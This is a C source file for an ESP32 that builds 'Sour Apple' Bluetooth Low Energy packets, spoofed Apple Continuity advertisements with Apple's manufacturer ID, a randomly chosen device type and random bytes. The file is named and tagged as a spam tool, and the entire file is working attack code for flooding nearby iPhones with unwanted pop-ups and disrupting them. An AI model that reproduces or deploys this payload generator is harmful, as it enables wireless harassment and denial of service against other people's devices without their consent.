// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "sour_apple_spam.h"

#include "esp_random.h"

static const char *TAG = "SOUR_APPLE_SPAM";

#define SOUR_APPLE_PAYLOAD_SIZE 17
#define SOUR_APPLE_RANDOM_BYTES 3

static const uint8_t SOUR_APPLE_TYPES[] = {
    0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
#define SOUR_APPLE_TYPES_COUNT (sizeof(SOUR_APPLE_TYPES) / sizeof(SOUR_APPLE_TYPES[0]))

int generate_sour_apple_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL || max_len < SOUR_APPLE_PAYLOAD_SIZE)
    return 0;

  uint8_t i = 0;
  buffer[i++] = 16;   // Length
  buffer[i++] = 0xFF; // Type
  buffer[i++] = 0x4C; // Apple ID LSB
  buffer[i++] = 0x00; // Apple ID MSB
  buffer[i++] = 0x0F;
  buffer[i++] = 0x05;
  buffer[i++] = 0xC1;

  buffer[i++] = SOUR_APPLE_TYPES[esp_random() % SOUR_APPLE_TYPES_COUNT];

  esp_fill_random(&buffer[i], SOUR_APPLE_RANDOM_BYTES);
  i += SOUR_APPLE_RANDOM_BYTES;

  buffer[i++] = 0x00;
  buffer[i++] = 0x00;
  buffer[i++] = 0x10;

  esp_fill_random(&buffer[i], SOUR_APPLE_RANDOM_BYTES);
  i += SOUR_APPLE_RANDOM_BYTES;

  return i;
}
